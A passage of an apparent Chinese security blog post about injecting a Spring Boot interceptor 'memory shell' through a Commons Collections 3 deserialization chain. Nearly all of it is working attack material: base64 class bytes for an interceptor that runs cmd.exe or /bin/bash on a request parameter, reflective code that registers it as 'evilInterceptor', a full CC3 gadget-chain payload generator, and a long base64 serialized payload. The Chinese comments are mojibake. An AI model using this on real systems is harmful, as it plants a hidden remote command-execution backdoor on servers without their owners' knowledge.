S9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAqACsHAIsMAI4AjwcAjAwAkACRAQAHb3MubmFtZQcAkgwAkwCPDACUAJUBAAN3aW4MAJYAlwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACoAmAEACS9iaW4vYmFzaAEAAi1jDACZAJoMAJsAnAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCNDACdAJ4MACoAnwwAKgCgAQAAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKEAlQwAogCjAQACDQoMAKQAlQwApQCmBwCnDACoAKkHAIoMAKoAKwwAqwArAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAVABVDABYAFkBADtvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABFqYXZhL2xhbmcvUHJvY2VzcwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEABWZsdXNoAQAFY2xvc2UAIQAnACgAAQApAAAABAABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAAAwALgAAAAwAAQAAAAUALwAwAAAAAQAxADIAAwAsAAACJwAGAAsAAADcKxICuQADAgA6BBkExgDOLLkABAEAOgUSBbgABrYABxIItgAJmQAiuwAKWQa9AAtZAxIMU1kEEg1TWQUZBFO3AA46BqcAH7sAClkGvQALWQMSD1NZBBIQU1kFGQRTtwAOOgYZBgS2ABFXGQa2ABI6B7sAE1m7ABRZGQe2ABW3ABa3ABc6CBIYOgm7ABlZtwAaOgoZCLYAG1k6CcYAIBkKuwAZWbcAGhkJtgAcEh22ABy2AB62ABxXp//bsgAfGQq2ACAZBRkKtgAhGQW2ACIZBbYAI6cABToFA6wErAABAA8A0wDWACQAAwAtAAAAVgAVAAAADwAKABAADwASABcAFAAnABUARgAXAGIAGQBpABoAcAAbAIUAHACJAB0AkgAeAJ0AHwC6ACEAwgAiAMkAIwDOACQA0wAmANYAJQDYACcA2gApAC4AAAB6AAwAQwADADMANAAGABcAvAA1ADYABQBiAHEAMwA0AAYAcABjADcAOAAHAIUATgA5ADoACACJAEoAOwA8AAkAkgBBAD0APgAKAAAA3AAvADAAAAAAANwAPwBAAAEAAADcAEEAQgACAAAA3ABDAEQAAwAKANIARQA8AAQARgAAAFUAB/0ARgcARwcASPwAGwcASf8ALwALBwBKBwBLBwBMBwBNBwBHBwBIBwBJBwBOBwBPBwBHBwBQAAAn/wAbAAUHAEoHAEsHAEwHAE0HAEcAAQcAUQEBAFIAAAAEAAEAJABTAAAADQMAPwAAAEEAAABDAAAAAQBUAFUAAwAsAAAAYAAFAAUAAAAKKissLRkEtwAlsQAAAAIALQAAAAoAAgAAAC4ACQAvAC4AAAA0AAUAAAAKAC8AMAAAAAAACgA/AEAAAQAAAAoAQQBCAAIAAAAKAEMARAADAAAACgBWAFcABABSAAAABAABACQAUwAAABEEAD8AAABBAAAAQwAAAFYAAAABAFgAWQADACwAAABgAAUABQAAAAoqKywtGQS3ACaxAAAAAgAtAAAACgACAAAAMwAJADQALgAAADQABQAAAAoALwAwAAAAAAAKAD8AQAABAAAACgBBAEIAAgAAAAoAQwBEAAMAAAAKAFoAWwAEAFIAAAAEAAEAJABTAAAAEQQAPwAAAEEAAABDAAAAWgAAAAEAXAAAAAIAXQ==&quot;</span>;<br>            <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.interceptor.TestInterceptor&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>            Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>            <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> (HandlerInterceptor) constructor.newInstance();<br>            adaptInterceptors.add(evilInterceptor);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>cc3é“¾å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Interceptor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„è®¾ç½®éœ€è¦æ»¡è¶³çš„å€¼</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;InterceptorDes.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//è¿™é‡Œçš„èµ‹å€¼åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±ä¸éœ€è¦äº†</span><br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br>        <span class="hljs-comment">//ç»“åˆå‰é¢çš„é“¾å­ä¸²è”èµ·æ¥ï¼Œéšä¾¿ä¸€ä¸ªéƒ½è¡Œ</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        annotation.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotation.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotation.newInstance(Override.class, proxyMap);<br>        System.out.println(serialize(o));<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>)).writeObject(obj);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bytes);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABhMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAjZsr+ur4AAAA0ALsKACoAZwoAaABpCABqCwBrAGwHAG0HAG4LAAUAbwgAcAoAFwBxBwByCgAKAHMKAHQAdQoAdAB2BwB3BwB4CgAPAHMIAHkHAHoKABIAZwoAEgB7BwB8CAB9BwB+BwB/BwBPCQCAAIEKABcAggoAgwB1CgCEAIUKAIQAhgcAhwgAiAoAgACJCgCDAIoKABcAiwoAjACNBwCOCwAOAI8HAJAKACcAcwcAkQcAkgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAaTGNvbS9jbG93bi9JbnRlcmNlcHRvckRlczsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAkwEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAVbWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAEWFkYXB0SW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEABGNvZGUBABJMamF2YS9sYW5nL1N0cmluZzsBAAFkAQACW0IBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAPZXZpbEludGVyY2VwdG9yAQA0TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOwEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47AQAUTGphdmEvbGFuZy9DbGFzczwqPjsBACJMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I8Kj47AQANU3RhY2tNYXBUYWJsZQcAbQcAbgcAlAcAcgcAdwcAeAcAkAEAClNvdXJjZUZpbGUBABNJbnRlcmNlcHRvckRlcy5qYXZhDAArACwHAJUMAJYAlwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAmAwAmQCaAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAD5vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyTWFwcGluZwwAmwCcAQATYWRhcHRlZEludGVyY2VwdG9ycwwAnQCeAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDACfACwHAJQMAKAAoQwAogCjAQAOamF2YS91dGlsL0xpc3QBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgER0Hl2NjZ2Z0FBQURRQXJBb0FLQUJlQ0FCRkN3QmZBR0FMQUdFQVlnZ0FZd29BWkFCbENnQUxBR1lJQUdjS0FBc0FhQWNBYVFjQWFnZ0Fhd2dBYkFvQUNnQnRDQUJ1Q0FCdkNnQUtBSEFLQUFvQWNRY0FjZ2NBY3dvQWRBQjFDZ0FVQUhZS0FCTUFkd2dBZUFjQWVRb0FHUUJlQ2dBVEFIb0tBQmtBZXdnQWZBb0FHUUI5Q1FCa0FINEtBSDhBZ0FvQWdRQ0FDZ0NCQUlJS0FJRUFnd2NBaEFzQUtRQ0ZDd0FwQUlZSEFJY0hBSWdIQUlrQkFBWThhVzVwZEQ0QkFBTW9LVllCQUFSRGIyUmxBUUFQVEdsdVpVNTFiV0psY2xSaFlteGxBUUFTVEc5allXeFdZWEpwWVdKc1pWUmhZbXhsQVFBRWRHaHBjd0VBUFV4dmNtY3ZZMnh2ZDI0dmMzQnlhVzVuWW05dmRHMWxiVzl5ZVhOb1pXeHNMMmx1ZEdWeVkyVndkRzl5TDFSbGMzUkpiblJsY21ObGNIUnZjanNCQUFsd2NtVklZVzVrYkdVQkFHUW9UR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGNYVmxjM1E3VEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObE8weHFZWFpoTDJ4aGJtY3ZUMkpxWldOME95bGFBUUFCY0FFQUdreHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemMwSjFhV3hrWlhJN0FRQUdkM0pwZEdWeUFRQVZUR3BoZG1FdmFXOHZVSEpwYm5SWGNtbDBaWEk3QVFBSGNISnZZMlZ6Y3dFQUUweHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN6c0JBQUZ5QVFBWVRHcGhkbUV2YVc4dlFuVm1abVZ5WldSU1pXRmtaWEk3QVFBR2NtVnpkV3gwQVFBU1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUhjbVZ6ZFd4MGN3RUFHVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZwYkdSbGNqc0JBQWR5WlhGMVpYTjBBUUFuVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjWFZsYzNRN0FRQUljbVZ6Y0c5dWMyVUJBQ2hNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVN0FRQUhhR0Z1Wkd4bGNnRUFFa3hxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQkdOdlpHVUJBQTFUZEdGamEwMWhjRlJoWW14bEJ3QnFCd0NLQndCcEJ3Q0hCd0NMQndDTUJ3Q0lCd0NOQndCeUJ3QjVCd0NFQVFBS1JYaGpaWEIwYVc5dWN3RUFFRTFsZEdodlpGQmhjbUZ0WlhSbGNuTUJBQXB3YjNOMFNHRnVaR3hsQVFDU0tFeHFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGNuWnNaWFJTWlhGMVpYTjBPMHhxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjblpzWlhSU1pYTndiMjV6WlR0TWFtRjJZUzlzWVc1bkwwOWlhbVZqZER0TWIzSm5MM053Y21sdVoyWnlZVzFsZDI5eWF5OTNaV0l2YzJWeWRteGxkQzlOYjJSbGJFRnVaRlpwWlhjN0tWWUJBQXh0YjJSbGJFRnVaRlpwWlhjQkFDNU1iM0puTDNOd2NtbHVaMlp5WVcxbGQyOXlheTkzWldJdmMyVnlkbXhsZEM5TmIyUmxiRUZ1WkZacFpYYzdBUUFQWVdaMFpYSkRiMjF3YkdWMGFXOXVBUUI1S0V4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sY25ac1pYUlNaWEYxWlhOME8weHFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGNuWnNaWFJTWlhOd2IyNXpaVHRNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHRNYW1GMllTOXNZVzVuTDBWNFkyVndkR2x2YmpzcFZnRUFBbVY0QVFBVlRHcGhkbUV2YkdGdVp5OUZlR05sY0hScGIyNDdBUUFLVTI5MWNtTmxSbWxzWlFFQUZGUmxjM1JKYm5SbGNtTmxjSFJ2Y2k1cVlYWmhEQUFxQUNzSEFJc01BSTRBandjQWpBd0FrQUNSQVFBSGIzTXVibUZ0WlFjQWtnd0Frd0NQREFDVUFKVUJBQU4zYVc0TUFKWUFsd0VBR0dwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56UW5WcGJHUmxjZ0VBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNCQUFkamJXUXVaWGhsQVFBQ0wyTU1BQ29BbUFFQUNTOWlhVzR2WW1GemFBRUFBaTFqREFDWkFKb01BSnNBbkFFQUZtcGhkbUV2YVc4dlFuVm1abVZ5WldSU1pXRmtaWElCQUJscVlYWmhMMmx2TDBsdWNIVjBVM1J5WldGdFVtVmhaR1Z5QndDTkRBQ2RBSjRNQUNvQW53d0FLZ0NnQVFBQUFRQVhhbUYyWVM5c1lXNW5MMU4wY21sdVowSjFhV3hrWlhJTUFLRUFsUXdBb2dDakFRQUNEUW9NQUtRQWxRd0FwUUNtQndDbkRB